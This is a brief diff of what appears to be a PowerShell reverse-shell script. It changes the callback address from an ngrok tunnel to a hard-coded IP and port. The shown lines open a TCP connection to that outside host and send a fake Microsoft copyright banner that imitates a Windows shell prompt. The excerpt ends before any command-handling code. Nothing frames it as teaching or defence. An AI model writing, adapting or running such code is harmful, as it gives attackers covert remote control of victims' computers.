@@ -1,4 +1,4 @@
-$c = New-Object System.Net.Sockets.TCPClient("4.tcp.ngrok.io",16895);
+$c = New-Object System.Net.Sockets.TCPClient("128.199.37.103",1234);
 $I = $c.GetStream();
 [byte[]]$U = 0..(2-shl15)|%{0};
 $U = ([text.encoding]::ASCII).GetBytes("Copyright (C) 2021 Microsoft Corporation. All rights reserved.`n`n")
